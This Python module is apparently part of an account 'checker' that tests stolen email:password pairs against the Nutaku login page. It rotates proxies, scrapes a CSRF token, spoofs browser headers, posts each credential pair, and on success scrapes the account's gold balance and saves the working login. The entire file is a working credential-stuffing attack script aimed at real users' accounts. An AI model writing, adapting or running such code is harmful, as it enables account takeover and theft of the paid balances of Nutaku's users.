from modules.variables import Checker
from modules.functions import bad_proxy, log,save,set_proxy
from requests import Session

def check(email:str,password:str):
    retries = 0
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)

        header_1 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" ,
            "Pragma": "no-cache" ,
            "Accept": "*/*" 
        }
        header_2 = {
            "content-type":"application/x-www-form-urlencoded",
            "referer": "https://www.nutaku.com/" ,
            "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"" ,
            "sec-ch-ua-mobile": "?0" ,
            "sec-ch-ua-platform": "\"Windows\"" ,
            "sec-fetch-dest": "empty" ,
            "sec-fetch-mode": "cors" ,
            "sec-fetch-site": "same-origin" ,
            "user-agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" ,
            "x-csrf-token": "" ,
            "x-requested-with": "XMLHttpRequest" 
        }
        data = f'email={email}&password={password}&rememberMe=1&recaptcha='
        try:
            with Session() as s:
                csrf = s.get('https://www.nutaku.com/',headers=header_1,proxies=proxy_set,timeout=Checker.timeout).text.split("<meta name=\"csrf-token\" content=\"")[1].split("\">")[0]
                header_2["x-csrf-token"] = csrf

                response = s.post('https://www.nutaku.com/execute-login/',headers=header_2,data=data,proxies=proxy_set,timeout=Checker.timeout).text
                if "login failed" in response or "Please check your email and password and try again" in response:
                    retries += 1
                elif "redirectURL" in response:
                    balance = s.get("https://www.nutaku.com/members/profile/",headers=header_1,proxies=proxy_set,timeout=Checker.timeout).text.split("<span class=\"general-title gold-amount js-refresh-gold-amount\"  data-trackid=\"NTK:MA:ACCOUNT:LINK nav header - gold cart - balance\"     >")[1].split("</span>")[0]
                    Checker.good += 1
                    Checker.cpm += 1
                    if not Checker.cui:
                        log("good",email+":"+password,"Nutaku")
                    save("Nutaku","good",Checker.time,email+":"+password+f" | Balance: {balance}")
                    return
                else:
                    raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1
    Checker.cpm += 1
    return